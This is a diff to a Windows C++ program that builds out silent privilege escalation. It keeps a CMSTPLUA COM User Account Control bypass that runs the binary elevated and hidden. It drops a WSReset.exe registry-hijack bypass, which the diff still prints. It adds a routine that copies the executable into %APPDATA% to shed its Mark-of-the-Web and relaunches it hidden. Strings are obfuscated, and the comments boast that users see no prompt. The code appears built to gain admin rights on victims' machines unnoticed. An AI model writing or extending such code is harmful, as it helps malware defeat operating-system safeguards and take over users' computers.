@@ -116,8 +116,16 @@ struct ICMLuaUtil : public IUnknown {
 };
 
 static bool ElevateCmstplua(const char* me, const char* args) {
-	HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
-	bool ownCom = SUCCEEDED(hr);
+	// MTA is required for out-of-process COM without a message pump.
+	// STA (APARTMENTTHREADED) can deadlock waiting for a window message that never comes.
+	HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
+	bool ownCom = (hr == S_OK);
+
+	// Permissive security — lets the elevated server impersonate this process
+	CoInitializeSecurity(NULL, -1, NULL, NULL,
+	    RPC_C_AUTHN_LEVEL_DEFAULT,
+	    RPC_C_IMP_LEVEL_IMPERSONATE,
+	    NULL, EOAC_NONE, NULL);
 
 	IUnknown* pUnk = nullptr;
 	hr = CoCreateInstance(CLSID_CMSTPLUA_, NULL, CLSCTX_LOCAL_SERVER,
@@ -129,7 +137,6 @@ static bool ElevateCmstplua(const char* me, const char* args) {
 	pUnk->Release();
 	if (FAILED(hr)) { if (ownCom) CoUninitialize(); return false; }
 
-	// Convert narrow paths to wide for the COM call
 	auto ToW = [](const char* s) -> std::wstring {
 		if (!s || !*s) return {};
 		int n = MultiByteToWideChar(CP_ACP, 0, s, -1, NULL, 0);
@@ -140,7 +147,6 @@ static bool ElevateCmstplua(const char* me, const char* args) {
 	std::wstring wMe   = ToW(me);
 	std::wstring wArgs = ToW(args);
 
-	// ShellExec runs via the elevated CMSTPLUA server — completely silent, no dialog
 	hr = pLua->ShellExec(wMe.c_str(),
 	                     wArgs.empty() ? NULL : wArgs.c_str(),
 	                     NULL, 0, SW_HIDE);
@@ -149,47 +155,37 @@ static bool ElevateCmstplua(const char* me, const char* args) {
 	return SUCCEEDED(hr);
 }
 
-// ── WSReset.exe AppX store bypass ─────────────────────────────────────────────
-// WSReset.exe (Windows Store Reset) is an auto-elevate binary that reads
-// HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command
-// before HKCR — writing there causes it to launch our binary with highest privilege.
-// Uses the AppX registry surface, distinct from ms-settings/mscfile paths.
-// Works at Default UAC level or lower on Windows 10/11.
+// ── Mark of the Web self-relocation ──────────────────────────────────────────
+// Files downloaded via a browser have a Zone.Identifier ADS (Zone 3 = Internet).
+// Windows blocks CLSCTX_LOCAL_SERVER COM activation from Zone 3 processes,
+// so CMSTPLUA silently fails. Copying to %APPDATA% removes the ADS restriction.
 
-static bool ElevateWsreset(const char* me) {
-	std::string key = S("Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command");
-	HKEY hk = NULL;
-	if (RegCreateKeyExA(HKEY_CURRENT_USER, key.c_str(), 0, NULL,
-	                    REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hk, NULL)
-	    != ERROR_SUCCESS) return false;
-	RegSetValueExA(hk, NULL, 0, REG_SZ, (LPBYTE)me, (DWORD)strlen(me)+1);
-	std::string delExec = S("DelegateExecute");
-	RegSetValueExA(hk, delExec.c_str(), 0, REG_SZ, (LPBYTE)"", 1);
-	RegCloseKey(hk);
-	Sleep(50);
-	std::string wsreset = S("WSReset.exe");
-	ShellExecuteA(NULL, S("open").c_str(), wsreset.c_str(), NULL, NULL, SW_HIDE);
-	Sleep(2500);
-	std::string base = S("Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2");
-	RegDeleteTreeA(HKEY_CURRENT_USER, base.c_str());
+static bool SelfRelocate(const char* me) {
+	std::string zoneCheck = std::string(me) + S(":Zone.Identifier");
+	HANDLE hZ = CreateFileA(zoneCheck.c_str(), GENERIC_READ, FILE_SHARE_READ,
+	                        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hZ == INVALID_HANDLE_VALUE) return false;
+	CloseHandle(hZ);
+
+	char appdata[MAX_PATH] = {};
+	GetEnvironmentVariableA(S("APPDATA").c_str(), appdata, sizeof(appdata));
+	const char* slash = strrchr(me, '\\');
+	const char* fname = slash ? slash + 1 : me;
+	std::string dest = std::string(appdata) + S("\\Microsoft\\Windows\\") + fname;
+	if (!CopyFileA(me, dest.c_str(), FALSE)) return false;
+
+	ShellExecuteA(NULL, S("open").c_str(), dest.c_str(), NULL, NULL, SW_HIDE);
 	return true;
 }
 
 // ── Master silent elevation ───────────────────────────────────────────────────
-// Tries two silent methods before falling back to the UAC dialog.
-// Method 1 (CMSTPLUA COM): no registry writes, works at all non-AlwaysNotify UAC levels.
-// Method 2 (WSReset AppX): AppX store registry surface, different from ms-settings/mscfile.
-// Method 3 (runas): last resort — shows the standard UAC elevation dialog.
-// If any method succeeds, the new elevated process runs this binary again and
-// this unelevated instance exits immediately.
+// CMSTPLUA COM: no registry writes, no visible side effects, works at all
+// non-AlwaysNotify UAC levels. Requires running from a path without Mark of the Web
+// (SelfRelocate handles that before this is called).
+// Fallback: standard UAC dialog via runas.
 
 static void SilentAutoElevate(const char* me, const char* args) {
-	// Method 1: CMSTPLUA COM (completely silent, no registry writes)
 	if (ElevateCmstplua(me, args)) return;
-	Sleep(200);
-	// Method 2: WSReset AppX bypass (silent at default UAC, different registry surface)
-	if (ElevateWsreset(me)) return;
-	// Method 3: UAC dialog (last resort — shows one popup)
 	SHELLEXECUTEINFOA sei = {};
 	sei.cbSize       = sizeof(sei);
 	sei.lpVerb       = S("runas").c_str();
@@ -200,13 +196,10 @@ static void SilentAutoElevate(const char* me, const char* args) {
 }
 
 int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, INT) {
-	// Silent auto-elevation: tries four UAC bypass methods before falling back
-	// to the standard "runas" verb (which shows a UAC dialog as last resort).
-	// On most default Windows 10/11 installs, Method 1 or 2 will succeed
-	// and the user sees NO popup at all — just a double-click.
 	if (!IsElevated()) {
 		char me[MAX_PATH] = {};
 		GetModuleFileNameA(NULL, me, MAX_PATH - 1);
+		if (SelfRelocate(me)) return 0;
 		SilentAutoElevate(me, lpCmdLine);
 		return 0;
 	}
